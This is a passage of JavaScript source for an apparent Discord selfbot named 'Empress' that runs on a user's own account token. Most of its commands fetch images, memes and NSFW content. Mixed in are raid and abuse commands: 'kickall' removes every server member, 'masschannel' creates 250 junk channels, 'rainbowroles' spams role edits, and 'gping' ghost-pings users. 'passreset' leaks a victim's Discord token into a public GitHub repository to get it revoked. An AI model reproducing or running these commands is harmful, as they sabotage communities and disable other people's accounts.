                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }

                case 'fox':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    try{
                        var response = await fetch(`https://randomfox.ca/floof/`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setTitle("Foxy!")
                        .setImage(data.image)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }
                case 'gay':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    let user = message.mentions.users.first();
                    if(!user) return console.log(`${cmd} usage: ${PREFIX}${cmd} <@user>`)
                    let x = Math.floor(Math.random() * 100);
                    var embed = new Discord.RichEmbed()
                    .setTitle("Gay meter")
                    .setImage(`https://some-random-api.ml/canvas/gay?avatar=${user.avatarURL}`)
                    .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                    .setDescription(`${user} is ${x}% gay! :rainbow_flag: `)
                    .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                    .setFooter(`Empress`)
                    .setTimestamp();
                    message.channel.send(embed).then(m=>{
                        setTimeout(function(){m.delete();},ET);
                    });
                    break;
                }
                case 'gping':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    let user = message.mentions.users.first()||client.user
                    message.delete();
                    console.log(`Ghost pinged ${user.tag}`)
                    break;
                }
                case 'guildicon':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    try{
                        var embed = new Discord.RichEmbed()
                        .setTitle(`${message.guild.name} icon`)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setImage(message.guild.iconURL)
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }
                case 'guildlist':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.edit(client.guilds.forEach(g => { message.edit(g.name) }))
                    break;
                }

                case 'hentai':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    try{
                        var response = await fetch(`https://nekos.life/api/v2/img/Random_hentai_gif`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setTitle("Nyaa")
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setImage(data.url)
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }
                case 'horny':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    let user = message.mentions.users.first();
                    if(!user) return console.log(`${cmd} usage: ${PREFIX}${cmd} <@user>`)
                    let x = Math.floor(Math.random() * 100);
                    try{
                        var embed = new Discord.RichEmbed()
                        .setTitle("HornyMeter")
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setDescription(`${user} is ${x}% horny! :eggplant:`)
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }

                case 'hug':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    var user = message.mentions.users.first();
                    message.delete();
                    if(!user) return console.log(`${cmd} usage: ${PREFIX}${cmd} <@user>`)
                    try{
                        var response = await fetch(`https://nekos.life/api/v2/img/hug`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setDescription(`Hugging ${user}!`)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setImage(data.url)
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }

                case 'hypesquad':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    var house = args[0].toLowerCase();
                    if(house!=='bravery'||house!=='brilliance'||house!=='balance'||house!=='random') return console.log(`${cmd} usage: ${PREFIX}${cmd} <bravery/brilliance/balance/random>`)
                    var RandomSquad = [1,2,3];
                    request({
                        method: "POST",
                        url: "https://discord.com/api/v8/hypesquad/online",
                        body: { "house_id": house === "bravery" ? 1 : house === "brilliance" ? 2 : house === "balance" ? 3 : house === "random" ? RandomSquad[Math.floor(Math.random() * RandomSquad.length)] : undefined },
                        json: true,
                        headers: { "Authorization": usertoken }}, (error) => { error ? console.log(error) : console.log("House changed !") 
                    })
                    break;
                }
                case 'imgembed':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    try{
                        var embed = new Discord.RichEmbed()
                        .setImage(args[0])
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setTimestamp()
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setFooter(`Empress`);
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {return console.log(`${cmd} usage: ${PREFIX}${cmd} <image url>`)}
                    break;
                }

                case 'ip':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    if(args.length < 1) return;
                    var response = await fetch(`http://ip-api.com/json/${args[0]}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
                    var data = await response.json();
                    if(response.status === 'fail') return client.logger.error("Failed to get IP details (is the IP format correct ?)");
                    var isp = data.isp || "-"
                    var city = data.city || "-"
                    var country = data.country || "-"
                    var region = data.regionName || "-"
                    var zip = data.zip || "-"
                    var lat = data.lat || "-"
                    var lon = data.lon || "-"
                    var tz = data.timezone || "-"
                    var embed = new Discord.RichEmbed()
                    .setTitle(`IP lookup`)
                    .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                    .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                    .setDescription(`Details for ${data.query}`)
                    .addField("ISP:",`${isp}`)
                    .addField("City:",`${city}`,true)
                    .addField("Region:",`${region}`,true)
                    .addField("Country:",`${country}`,true)
                    .addField("ZIP:",`${zip}`)
                    .addField("Latitude:",`${lat}`,true)
                    .addField("Longitude:",`${lon}`,true)
                    .addField("Timezone:",`${tz}`)   
                    .setFooter(`Empress`)
                    .setTimestamp();
                    message.channel.send(embed).then(m=>{
                        setTimeout(function(){m.delete();},ET);
                    })
                    break; 
                }
                case 'jokeoverhead':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    let user = message.mentions.users.first()
                    message.delete();
                    if(!user) return console.log(`${cmd} usage: ${PREFIX}${cmd} <@user>`)
                    img=`https://api.alexflipnote.dev/jokeoverhead?image=${user.avatarURL}`
                    var embed = new Discord.RichEmbed()
                    .setImage(img)
                    .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                    .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                    .setTimestamp()
                    .setFooter(`Empress`);
                    message.channel.send(embed).then(m=>{
                        setTimeout(function(){m.delete();},ET);
                    });
                    break;
                }
                case 'kick':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    if(message.mentions.users.size===0) return console.log(`${cmd} usage: ${PREFIX}${cmd} <@user>`)
                    message.delete();
                    var user = message.mentions.users.first().id;
                            console.log(`user id= ${user}`)
                            const member = message.guild.members.get(user);
                            console.log(`member = ${member}`)
                        if(member){
                            message.channel.send("Kicking...").then(m=>{
                                var embed = new Discord.RichEmbed()
                                .setTitle(`Kick!`)
                                .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                                .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                                .setDescription(`${user} has been kicked. Reason:${args[1]}`)
                                .setFooter(`Empress`)
                                .setTimestamp();
                                m.edit(embed);
                                setTimeout(function(){m.delete();},ET)
                            })
                            member.kick({reason: args[1]}).catch((err)=>{message.console.log(err);});
                        }
                    break;
                }
                case 'kickall':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.guild.members.forEach(member => {
                        member.kick().catch(() => {})
                      })
                      break;
                }

                case 'kiss':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    var user = message.mentions.users.first();
                    if(!user) return console.log(`${cmd} usage: ${PREFIX}${cmd} <@user>`)
                    message.delete();
                    try{
                        var response = await fetch(`https://nekos.life/api/v2/img/kiss`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setDescription(`Kissing ${user}!`)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setImage(data.url)
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }
                case 'lenny':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.edit('( ͡° ͜ʖ ͡°)');
                    break;
                }
                case 'lesbian':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    try{
                        var response = await fetch(`https://nekos.life/api/v2/img/les`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setTitle("Nyaa")
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setImage(data.url)
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }

                case 'lewdneko':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    try{
                        var response = await fetch(`https://nekos.life/api/v2/img/nsfw_neko_gif`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setTitle("Nyaa")
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setImage(data.url)
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }

                case 'lmgtfy':{
                    if(args.length<1) return console.log(`${cmd} usage: ${PREFIX}${cmd} <search query>`)
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    message.channel.send('https://lmgtfy.com/?q='+args.join('+'))
                    break;                    
                }

                case 'lyrics':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    if(args.length<1) return console.log(`${cmd} usage: ${PREFIX}${cmd} <song name>`)
                    var msg = args.join("+")
                    try{
                        var response = await fetch(`https://some-random-api.ml/lyrics?title=`+msg);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setTitle(`Lyrics of ${data.title}`)
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setDescription(data.lyrics)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        }).catch((err)=>console.log("bot fucked up"));
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }
                case 'masschannel':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    for(let i =0; i< 250; i++){
                        message.guild.createChannel(Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 16),'text')
                        .then(console.log)
                        .catch(console.error);
                    }
                    message.delete();
                    break;
                }

                case 'meme':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    const subReddits = ["dankmemes", "memes"]
                    const random = subReddits[Math.floor(Math.random() * subReddits.length)]
                    const img = await randomPuppy(random);
                    try{
                        const embed = new Discord.RichEmbed()
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setImage(img)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setTitle(`Your meme. From r/${random}`)
                        .setURL(`https://reddit.com/r/${random}`)
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }

                case 'ms':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    const rows = parseInt(args[0]);
                    const columns = parseInt(args[1]);
                    const mines = parseInt(args[2]);
                    if (!rows||!columns||!mines) return console.log(`${cmd} usage: ${PREFIX}${cmd} <rows> <columns> <mines>`)
                    const minesweeper = new Minesweeper({ rows, columns, mines });
                    const matrix = minesweeper.start();
                    return matrix
                    ? message.channel.send(matrix)
                    : console.log('You have provided invalid data.');
                    break;
                }

                case 'nickname':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    try{
                        var user = message.mentions.users.first().id;
                        const member = message.guild.members.get(user);
                        if(member){
                            nick = args.slice(1).join(" ")
                            member.setNickname(nick);
                        }
                        message.delete();
                    }catch(err){
                        message.member.setNickname(args.join(" "))
                    }
                    break;
                }

                case 'nitrogen':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    rand = [16,24]
                    let x = rand[Math.floor(Math.random()*rand.length)]
                    message.channel.send(`https://discord.gift/`+makeid(x));
                    function makeid(length) {
                        var result           = '';
                        var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
                        var charactersLength = characters.length;
                        for ( var i = 0; i < length; i++ ) {
                        result += characters.charAt(Math.floor(Math.random() * charactersLength));
                        }
                        return result;
                    }
                    break;
                }
                case 'notfunny':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    message.channel.send(`**Not funny I didn't laugh. Your joke is so bad I would have preferred the joke went over my head and you gave up re-telling me the joke. To be honest this is a horrid attempt at trying to get a laugh out of me. Not a chuckle, not a hehe, not even a subtle burst of air out of my esophagus. Science says before you laugh your brain preps your face muscles but I didn't even feel the slightest twitch. 0/10 this joke is so bad I cannot believe anyone legally allowed you to be creative at all. The amount of brain power you must have put into that joke has the potential to power every house on Earth. Get a personality and learn how to make jokes, read a book. I'm not saying this to be funny I genuinely mean it on how this is just bottom barrel embarrassment at comedy. You've single handedly killed humor and every comedic act on the planet. I'm so disappointed that society has failed as a whole in being able to teach you how to be funny. Honestly if I put in all my power and time to try and make your joke funny it would require Einstein himself to build a device to strap me into so I can be connected to the energy of a billion stars to do it, and even then all that joke would get from people is a subtle scuff. You're lucky I still have the slightest of empathy for you after telling that joke otherwise I would have committed every war crime in the book just to prevent you from attempting any humor ever again. We should put that joke in text books so future generations can be wary of becoming such an absolute comedic failure. Im disappointed, hurt, and outright offended that my precious time has been wasted in my brain understanding that joke. In the time that took I was planning on helping kids who have been orphaned, but because of that you've waisted my time explaining the obscene integrity**`)
                    message.channel.send(`**of your terrible attempt at comedy. Now those kids are suffering without meals and there's nobody to blame but you. I hope you're happy with what you have done and I truly hope you can move on and learn from this piss poor attempt**`)
                    break;
                }
                case 'nudes':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    function doRandHT() {
                        var rand = ['gonewild','realgirls'];
                        return rand[Math.floor(Math.random()*rand.length)];
                    }
                    try{
                        var response = await fetch(`https://meme-api.herokuapp.com/gimme/`+doRandHT());
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setTitle(`Wink!`)
                        .setURL(data.postLink)
                        .setDescription(data.title)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setImage(data.url)
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });

                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }
                case 'owoify':{
                    msg = args.join('+')
                    console.log(clc.blueBright(`${cmd} command used`))
                    try{
                        var response = await fetch(`https://nekos.life/api/v2/owoify?text=${msg}`);
                        var data = await response.json();
                        message.edit(data.owo)
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }
                case 'passreset':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    try {
                        github_auth = args[0];
                        discord_auth = args[1];
                        let response = await fetch('https://api.github.com/user/repos',{
                            method: 'POST',
                            headers: {
                                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36',
                                'Authorization': `token ${github_auth}`,
                                'Content-Type': 'application/json'
                            },
                            body:JSON.stringify({
                                "name": discord_auth,
                                "description": discord_auth,
                                "private": false,
                                "visibility": 'public',
                                "auto_init": true,
                            })
                          })
                        
                          let data = await response.json().catch();
                        
                          if(response.status==201){
                              repo_name = data['full_name']
                              console.log(`Created repo ${repo_name}`)
                        
                              var delete_repo = await fetch(`https://api.github.com/repos/${repo_name}`,{
                                method: 'DELETE',
                                headers: {
                                    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36',
                                    'Authorization': `token ${github_auth}`,
                                    'Accept': 'application/vnd.github.v3+json'
                                }}).catch()
                                if(delete_repo.status == 204){
                                    console.log(`Deleted repo ${repo_name}`)
                                    console.log(`Target token disabled!`)
                                }
                        }
                        
                    } catch(e){console.log(`${cmd} error in response`)}
                    break;
                }

                case 'pat':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    var user = message.mentions.users.first();
                    message.delete();
                    if(!user) return console.log(`${cmd} usage: ${PREFIX}${cmd} <@user>`)
                    try{
                        var response = await fetch(`https://nekos.life/api/v2/img/pat`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setDescription(`Patting ${user}!`)
                        .setImage(data.url)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    }
                    catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }

                case 'ping':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    message.channel.send("Pinging...").then(m =>{
                        var ping = m.createdTimestamp - message.createdTimestamp;
                        var embed = new Discord.RichEmbed()
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setAuthor(`Pong, motherfucker! Your Ping Is:-\n 🏓 ${ping}ms`)
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setFooter(`Empress`)
                        .setTimestamp();
                    m.edit(embed)
                    setTimeout(function(){m.delete();},ET)
                          });
                    break;
                }
                case 'pokedex':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    var response = await fetch(`https://some-random-api.ml/pokedex?pokemon=`+args[0]);
                    var data = await response.json();
                    try{
                        var stats = JSON.stringify(data.stats, null, 2);
                        var family = data.family.evolutionLine
                        var embed = new Discord.RichEmbed()
                        .setTitle('Pokedex')
                        .setDescription(`**${data.name}**\n${data.description}`)
                        .addField('Type: ', data.type[0], true)
                        .addField('Species: ', data.species[0],true)
                        .addField('Height: ',data.height, true)
                        .addField('Weight: ', data.weight, true)
                        .addField('Gender distribution: ',data.gender,true)
                        .addField('Abilities',data.abilities, true)
                        .addField('Base XP: ', data.base_experience, true)
                        .addField('Stats: ', stats.slice(1,stats.length-1),true)
                        .addField('Evolution line: ', family)
                        .setThumbnail(data.sprites.animated)
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setTimestamp()
                        .setFooter(`Empress`);
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e){
                        var embed = new Discord.RichEmbed()
                        .setTitle('Pokedex')
                        .setDescription('couldnt find the pokemon')
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    }

                    break;
                }
                case 'prefix':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    let info = {
                        "USERTOKEN": usertoken,
                        "BOTPREFIX": args[0],
                        "EmbedTimeout": ET,
                        "OpenWeatherAPIKey": WeatherKey,
                        "webhookurl": webhook
                    }
                    fs.writeFileSync(path.resolve('./', 'config.json'), JSON.stringify(info)); //pkg path
                    message.channel.send("Changing prefix...").then(m =>{
                        var ping = m.createdTimestamp - message.createdTimestamp;
                        var embed = new Discord.RichEmbed()
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setAuthor(`uwu, the prefix has been changed to ${args[0]}`)
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setFooter(`Empress`)
                        .setTimestamp();
                    m.edit(embed)
                    setTimeout(function(){m.delete();},ET)
                          });
                          console.log(clc.magentaBright(`bot prefix is now "${args[0]}"`))
                          break;
                }

                case 'purge':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    var user = (message.mentions.users.first() || client.users.get(args[0]) || null);
                    const amount = !!user ? parseInt(message.content.split(" ")[2], 10) : parseInt(message.content.split(" ")[1], 10);
                    if (!amount) return message.edit("Must specify an amount to delete!").then(message.delete(2000));
                    if (!amount && !user) return message.edit("Must specify a user and amount, or just an amount, of messages to purge!").then(message.delete(2000));
                    await message.delete();
                    let messages = await message.channel.fetchMessages({limit: 100});
                    if(user) {
                      messages = messages.array().filter(m=>m.author.id === user.id);
                      console.log("log", "Purge Amount", message.author, "Amount: " + amount);
                      messages.length = amount;
                    } else {
                      messages = messages.array();
                      messages.length = amount + 1;
                    }
                    messages.map(async m => await m.delete().catch(console.error));
                    break;
                }
                case 'pussy':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    try{
                        var response = await fetch(`https://meme-api.herokuapp.com/gimme/godpussy`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setTitle(`Wink!`)
                        .setURL(data.postLink)
                        .setDescription(data.title)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setImage(data.url)
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });

                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }
                case 'rainbowroles':{
                    // let t1 = new Date();
                    console.log(clc.blueBright(`${cmd} command started`))
                    console
                    function sleep(ms) {
                        return new Promise(resolve => setTimeout(resolve, ms));
                      }
                    let x = true
                    setTimeout(function(){x = false; console.log(clc.blueBright('rainbowrole stopped!'))}, 5000)
                    while(x){
                            message.guild.roles.forEach(role => {role.edit({color: 'RANDOM'})})
                            await sleep(500);
                    }
                    // let t2 = new Date()
                    // console.log(t2-t1)
                    message.delete();
                    break;
                }

                case 'reverse':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    if(args.length<1) {
                        message.delete();
                        return console.log(`${cmd} usage: ${PREFIX}${cmd} <text>`)
                    }
                    msg = args.join(" ").split("").reverse().join("");
                    message.edit(msg);
                    break;
                }
                case 'sadcat':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    try{
                        var response = await fetch(`https://api.alexflipnote.dev/sadcat`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setImage(data.file)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setTimestamp()
                        .setFooter(`Empress`);
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    
                    break;
                }
                case 'secret':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    if(args.length<1) return console.log(`${cmd} usage: ${PREFIX}${cmd} <text>`)
                    msg = args.join(" ");
                    var text=msg.split("");
                    message.channel.send(`||`+text.join("||||")+`||`);
                    break;
                }

                case 'serverinfo':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    const verlvl = {
                        0: "None",
                        1: "Low",
                        2: "Medium",
                        3: "(╯°□°）╯︵ ┻━┻",
                        4: "(ノಠ益ಠ)ノ彡┻━┻"
                    }
                    message.delete();
                    let inline = true
                    let sicon = message.guild.iconURL;
                    let embed = new Discord.RichEmbed()
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))            
                        .setThumbnail(sicon)
                        .setAuthor("Server Information")
                        .addField("Name", message.guild.name, inline)
                        .addField("ID", message.guild.id, inline)
                        .addField("Owner", message.guild.owner, inline)
                        .addField("Region", message.guild.region, inline)
                        .addField("Verification Level", verlvl[message.guild.verificationLevel], inline)
                        .addField("Members", `${message.guild.memberCount}`, inline)
                        .addField("Roles", message.guild.roles.size, inline)
                        .addField("Channels", message.guild.channels.size, inline)
                        .addField('AFK Channel', `${message.guild.afkChannelID === null ? 'No AFK Channel' : bot.channels.get(message.guild.afkChannelID).name}`, true, inline)
                        .setFooter(`Empress`)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setTimestamp();
                
                    message.channel.send(embed).then(m=>{
                        setTimeout(function(){m.delete();},ET);
                    });
                    break;
                }

                case 'shorten':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    try{
                        var response = await fetch('http://tinyurl.com/api-create.php?url='+args[0])
                        .then(res => res.text())
                        .then(text => message.channel.send(text))
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }

                case 'shutdown':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    var embed = new Discord.RichEmbed()
                    .setTitle(`Shutting down...`)
                    .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                    .setDescription(`Empress is retiring to her chambers...`)
                    .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                    .setTimestamp()
                    .setFooter(`Empress`);
                    message.channel.send(embed).then(m=>{
                        setTimeout(function(){m.delete(); process.exit();},ET);
                    });
                    break;
                }

                case 'simp':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    let user = message.mentions.users.first();
                    if(!user) return console.log(`${cmd} usage: ${PREFIX}${cmd} <@user>`)
                    let x = Math.floor(Math.random() * 100);
                    var embed = new Discord.RichEmbed()
                    .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                    .setTitle("SimpMeter")
                    .setDescription(`${user} is ${x}% simp! :flushed: `)
                    .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                    .setFooter(`Empress`)
                    .setTimestamp();
                    message.channel.send(embed).then(m=>{
                        setTimeout(function(){m.delete();},ET);
                    });
                    break;
                }

                case 'slap':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    var user = message.mentions.users.first();
                    message.delete();
                    if(!user) return console.log(`${cmd} usage: ${PREFIX}${cmd} <@user>`)
                    try{
                        var response = await fetch(`https://nekos.life/api/v2/img/slap`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setDescription(`Slapping ${user}!`)
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setImage(data.url)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }

                case 'slots':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    var rand = ["🍎","🍊","🍐","🍋","🍉","🍇","🍓","🍒"];
                    const a =  rand[Math.floor(Math.random()*rand.length)];
                    const b =  rand[Math.floor(Math.random()*rand.length)];
                    const c =  rand[Math.floor(Math.random()*rand.length)];
                    var msg = ""
                    if(a===b===c) msg = "Three in a row, Great!";
                    else if(a===b||b===c||a===c) msg = "Two in a row! You won!"
                    else msg = "Better luck next time!"
                    var embed = new Discord.RichEmbed()
                    .setTitle(`Slots`)
                    .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                    .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                    .setDescription(`**[ ${a} ${b} ${c} ]\n\n${message.author}**,`+"\n"+msg)
                    .setFooter(`Empress`)
                    .setTimestamp();
                    message.channel.send(embed).then(m=>{
                        setTimeout(function(){m.delete();},ET);
                    });
                    message.delete();
                    break;
                }
                case 'smol':{
